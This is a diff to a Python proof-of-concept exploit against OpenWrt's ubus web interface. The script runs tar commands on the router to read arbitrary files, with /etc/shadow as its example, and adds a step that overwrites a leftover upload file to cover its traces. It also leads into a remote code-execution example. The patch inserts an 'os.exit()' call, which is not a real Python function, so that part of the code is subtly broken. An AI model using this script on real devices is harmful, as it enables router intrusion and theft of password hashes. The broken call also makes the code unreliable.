@@ -2,6 +2,7 @@
 import requests
 import time
 import json
+import os
 
 proto = "http"
 host = "192.168.8.1"
@@ -74,11 +75,14 @@ class PocOpenWrt:
     def read_file(self, file):
         data = []
         data.append( self.ubus_read_file(1, "/bin/tar -zcf /tmp/poc.tgz {}".format(file)) )
-        data.append( self.ubus_read_file(2, "/bin/tar -zxf /tmp/poc.tgz -O") )  
+        data.append( self.ubus_read_file(2, "/bin/tar -zxf /tmp/poc.tgz -O") )
+        # Clean file
+        data.append( self.ubus_write_file(3, "/tmp/upload.ipk", "", self.permission_default) )
+        data.append( self.ubus_read_file(4, "/bin/tar -zcf /tmp/poc.tgz /tmp/upload.ipk") )
         r = requests.post(self.ubus_page, json=data, proxies=self.proxies, verify=False, allow_redirects=False)
         json_data = json.loads(r.text)
         if json_data[1]["result"][1]["code"] == 0:
-            print(json_data[1]["result"][1]["stdout"])
+            print(json_data[1]["result"][1].get("stdout", ""))
         return True 
 
     def write_file(self, file, content, permission):
@@ -96,6 +100,7 @@ if __name__ == "__main__":
         # Example of read file
         poc.read_file("/etc/shadow")
 
+        os.exit()
 
         # Example code execution
         print("Write temp script and apply execution permission")
